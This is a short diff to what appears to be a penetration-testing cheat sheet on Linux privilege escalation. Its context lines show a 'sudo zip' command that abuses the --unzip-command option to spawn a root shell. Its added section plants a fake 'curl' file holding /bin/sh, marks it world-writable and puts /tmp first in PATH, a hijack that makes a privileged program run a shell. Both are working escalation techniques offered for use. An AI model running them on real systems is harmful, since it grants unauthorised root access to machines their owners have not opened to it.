@@ -23,6 +23,12 @@ local to remote
 ```
 sudo zip filename.zip filename.txt -T --unzip-command="sh -c /bin/bash"
 ```
+## export
+```
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+```
 
 
 ## sudo enum
